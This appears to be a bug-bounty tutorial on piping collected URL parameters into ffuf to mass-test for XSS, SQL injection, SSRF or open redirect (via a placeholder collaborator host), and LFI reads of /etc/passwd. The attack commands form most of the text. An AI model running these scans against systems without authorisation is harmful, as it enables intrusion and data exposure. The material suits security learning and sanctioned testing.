To automatically test your filtered juicy_parameters.txt file for live vulnerabilities, you will pass those discovered parameters directly into ffuf (Fuzz Faster U Fool).
Because ffuf replaces the keyword FUZZ with items from a wordlist, you can dynamically swap parameter values or append malicious payloads to the URLs.
------------------------------
## Method 1: Testing for Cross-Site Scripting (XSS)
To test if input parameters reflect data without filtering, you can replace the parameter values with an XSS payload.

   1. Prepare the parameters: Use sed to replace everything after the = sign with the word FUZZ.
   
   cat juicy_parameters.txt | sed 's/=.*/=FUZZ/' | sort -u > xss_targets.txt
   
   2. Run FFUF: Use a basic XSS payload wordlist to inject into the parameter slot.
   
   ffuf -w ~/bugbounty/SecLists/Fuzzing/XSS/XSS-Bypass-Strings.txt:PAYLOAD -w xss_targets.txt:URL -u "URLPAYLOAD" -mc 200
   
   * Note: If a parameter reflects your payload cleanly in the response size/content, manually inspect it in a browser for execution.
   
------------------------------
## Method 2: Testing for SQL Injection (SQLi)
To look for database errors or time delays, you want to append SQL syntax errors directly to the end of the existing values.

   1. Run FFUF: This command takes each full URL from your list and appends a single quote ('), an OR statement, or a database sleep command to the end.
   
   ffuf -w ~/bugbounty/SecLists/Fuzzing/Databases/SQLI.txt:PAYLOAD -w juicy_parameters.txt:URL -u "URLPAYLOAD" -mr "SQL syntax|mysql|Error"
   
   * -mr "SQL syntax|mysql|Error": This flag tells ffuf to only show responses that return raw database error messages, a classic indicator of SQLi.
   
------------------------------
## Method 3: Testing for Server-Side Request Forgery (SSRF) or Open Redirect
If you found parameters like ?url=, ?redirect=, or ?dest=, you can force the application to point to an external server you control (like a Burp Collaborator or Webhook.site URL).

   1. Isolate callback parameters:
   
   cat juicy_parameters.txt | grep -E "(url=|redirect=|dest=|link=|uri=|path=)" | sed 's/=.*/=/' > ssrf_targets.txt
   
   2. Run FFUF: Replace the destination with your testing server address.
   
   ffuf -w ssrf_targets.txt:URL -u "URLhttp://YOUR_COLLABORATOR_OR_WEBHOOK_URL" -m MATCH_ALL
   
   * Monitor your external web server logs. If you see an incoming ping from the target company's IP address, you have achieved an SSRF vulnerability.
   
------------------------------
## Method 4: Mass Probing for File Inclusion (LFI)
If the parameters look like they pull local files (e.g., ?file=, ?page=, ?doc=), you can fuzz them to try reading sensitive system configuration files.

# Isolate file-handling parameters
cat juicy_parameters.txt | grep -E "(file=|page=|doc=|path=|include=)" | sed 's/=.*/=/' > lfi_targets.txt
# Fuzz for the Linux passwd file
ffuf -w ~/bugbounty/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:PAYLOAD -w lfi_targets.txt:URL -u "URLPAYLOAD" -mr "root:x:"


* -mr "root:x:": This filters specifically for the standard structure found inside a Linux /etc/passwd file, indicating a complete read exploit.

